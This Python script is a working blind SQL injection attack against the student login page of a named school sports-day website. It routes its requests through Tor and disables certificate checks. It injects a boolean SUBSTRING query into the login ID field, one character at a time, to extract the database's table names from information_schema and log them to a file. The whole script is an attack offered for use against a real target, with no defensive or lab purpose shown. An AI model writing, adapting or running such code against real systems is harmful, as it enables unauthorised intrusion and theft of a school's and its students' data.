import time
import requests

url = "http://sports.hys.edu.hk/aos/e-sportsday/student/index.php"
schema = "sch_sportsday_hys_eng"

#DO NOT CHANGE THIS PART
prox = {'http': "socks5://127.0.0.1:9050"}
rcookie = requests.get(url, proxies=prox)
cookies = {"PHPSESSID":rcookie.cookies['PHPSESSID']}
alphabet = [
"_",
"e","t","a","i","n","o","s","h","r","d","l","u","c","m","f","w","y","g","p","b","v","k","q","j","x","z",
#"E","T","A","I","N","O","S","H","R","D","L","U","C","M","F","W","Y","G","P","B","V","K","Q","J","X","Z",
#"0","1","2","3","4","5","6","7","8","9"
]
#DO NOT CHANGE THIS PART

out = open("tablenamebyschema.txt","w")
localtime = time.asctime( time.localtime(time.time()) )
out.write(localtime+"\n")
out.close()
out = open("tablenamebyschema.txt","a")


tablecount = 74
tablestart = 21
correct = "p"


for table in range(tablestart,tablecount):
    isTableFinished = False
    char = 1
    temp = ""
    out.write(str(table)+" ")
    while not isTableFinished:
        for letter in alphabet:
            injection = "a' OR IF('"+letter+"'=(SELECT SUBSTRING(table_name,"+str(char)+",1) FROM information_schema.tables WHERE table_schema='"+schema+"'LIMIT 1 OFFSET "+str(table)+"),1,'a'); -- "
            response = requests.post(
                url,
                cookies=cookies,
                data={
                'input_unique_id': injection,
                'input_pass': 'a',
                'btn_login': 'Submit',
                },
                verify=False,
                proxies=prox
            )

            #print(response.text)
            #time.sleep(0.3)

            if response.text[40]=='p':
                print("correct, char "+str(char)+": "+letter)
                out.write(letter)
                temp += letter
                char += 1
                break
        else:
            print("table done")
            out.write("\n")
            isTableFinished = True
    
    print("Table "+str(table)+": "+temp)
    print("next table")
localtime = time.asctime( time.localtime(time.time()) )
out.write(localtime)